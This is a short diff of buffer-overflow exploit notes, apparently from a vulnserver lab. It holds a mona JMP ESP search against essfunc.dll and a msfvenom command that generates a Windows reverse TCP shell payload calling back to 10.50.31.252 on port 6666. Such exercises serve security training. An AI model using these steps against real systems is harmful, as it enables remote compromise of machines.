@@ -56,4 +56,4 @@
 !mona jmp -r esp -m "essfunc.dll"
 
 
-Payload: msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.31.252 LPORT=6666 -b"x\00" -f python
+Payload: msfvenom -p windows/reverse_tcp LHOST=10.50.31.252 LPORT=6666 -b"x\00" -f python
